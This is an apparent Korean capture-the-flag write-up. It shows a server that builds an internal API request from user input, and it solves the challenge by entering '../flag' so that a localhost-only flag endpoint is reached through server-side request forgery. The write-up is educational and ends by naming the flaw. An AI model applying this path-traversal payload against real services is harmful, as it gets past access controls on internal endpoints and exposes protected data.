# 내부 API 경로 조작

입력한 `userid`가 내부 요청 경로에 그대로 들어간다.

## 코드 확인

```python
API_HOST = 'http://127.0.0.1:8000'

userid = request.form.get('userid', '')
info = requests.get(f'{API_HOST}/api/user/{userid}').text
```

`/get_info`에서 입력한 값으로 서버가 직접 요청을 보낸다.

```python
if request.remote_addr == '127.0.0.1':
    return func(*args, **kwargs)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG
```

`/api/flag`는 내부에서만 접근할 수 있다. 서버의 요청을 이용해 보자.

## 풀이

**1.** `/get_info`의 userid 입력칸에 넣는다.

```text
../flag
```

**2.** 요청 경로가 정리되면서 `/api/flag`로 바뀐다.

```text
/api/user/../flag → /api/flag
```

서버가 내부 주소로 요청하므로 접근 제한을 통과하고, 응답에 플래그가 표시된다.

> 입력값을 경로에 그대로 넣어서 생긴 문제다.
